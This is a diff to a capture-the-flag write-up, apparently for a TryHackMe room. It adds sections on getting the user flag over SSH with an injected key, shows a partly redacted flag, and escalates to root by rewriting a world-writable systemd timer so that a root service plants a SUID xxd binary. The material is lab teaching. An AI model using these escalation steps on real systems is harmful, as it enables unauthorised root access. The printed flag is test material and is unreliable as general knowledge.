@@ -272,10 +272,93 @@ ssh -i cheese_key [REDACTED]@10.x.x.x
 
 This gave me shell access as the `[REDACTED]` user without needing to know the account password.
 
-<img width="686" height="718" alt="ssh-login-user" src="https://github.com/user-attachments/assets/5bd36892-9b9d-4af1-8c5c-876f1e95607f" />
+<img width="686" height="718" alt="ssh-login-user" src="https://github.com/user-attachments/assets/86280bae-7d87-4bc5-8e14-5ed52d18f121" />
 
 
-9. User Flag
-10. Privilege Escalation to Root
+## 9. User Flag
+
+After injecting my SSH public key and authenticating successfully, I gained shell access as the `comte` user.
+
+To confirm the session and capture the user flag, I ran:
+
+```bash
+whoami
+ls
+cat user.txt
+```
+<img width="416" height="581" alt="username-user-shell" src="https://github.com/user-attachments/assets/29828ddf-e0c8-49bd-8381-ae0165edec26" />
+
+The output confirmed that I was logged in as `[REDACTED]`, and I was able to read the user flag from the home directory.
+```text
+THM{9f2ce3df1beeecaf...redacted}
+```
+
+## 10. Privilege Escalation to Root
+
+After obtaining access as `[REDACTED]`, I checked the user's `sudo` privileges to identify possible privilege escalation paths.
+
+```bash
+sudo -l
+```
+<img width="514" height="105" alt="sudo-l-output" src="https://github.com/user-attachments/assets/5ddbf7f0-6a02-4567-8fdd-78b77973285b" />
+
+The output showed that `[REDACTED]` could run the following commands without a password:
+
+`- /bin/systemctl daemon-reload`
+
+`- /bin/systemctl restart exploit.timer`
+
+`- /bin/systemctl start exploit.timer`
+
+`- /bin/systemctl enable exploit.timer`
+
+This suggested that a systemd timer and service were involved in the escalation path, so I inspected both unit files.
+
+```bash
+systemctl cat exploit.timer
+systemctl cat exploit.service
+cat /etc/systemd/system/exploit.timer
+cat /etc/systemd/system/exploit.service
+```
+<img width="705" height="552" alt="systemctl-cat-exploit-units" src="https://github.com/user-attachments/assets/8ea8dff8-e907-482f-83ae-6cff1d225ab2" />
+
+The service file showed the following command:
+
+`ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"`
+
+This meant that if the service ran successfully as root, it would copy xxd to /opt/xxd and set the SUID bit on it.
+
+However, the timer was broken because OnBootSec= was empty. I checked the permissions of the unit files and found that exploit.timer was world-writable.
+
+```bash
+ls -l /etc/systemd/system/exploit.timer /etc/systemd/system/exploit.service
+```
+<img width="833" height="51" alt="exploit-timer-permissions" src="https://github.com/user-attachments/assets/ed6d3207-19b3-472d-ad97-0d4082284b95" />
+
+I modified exploit.timer to include a valid timer configuration:
+
+```bash
+cat > /etc/systemd/system/exploit.timer << 'EOF'
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=1sec
+Unit=exploit.service
+
+[Install]
+WantedBy=timers.target
+EOF
+```
+Then I reloaded systemd and started the timer:
+```bash
+sudo systemctl daemon-reload
+sudo systemctl start exploit.timer
+sleep 2
+ls -l /opt/xxd
+```
+<img width="510" height="87" alt="trigger-exploit-timer" src="https://github.com/user-attachments/assets/f9b8a3cd-0e2f-4b74-ba05-b9b74d1999db" />
+This created /opt/xxd as a SUID binary owned by root.
+
 11. Root Flag
 12. Lessons Learned
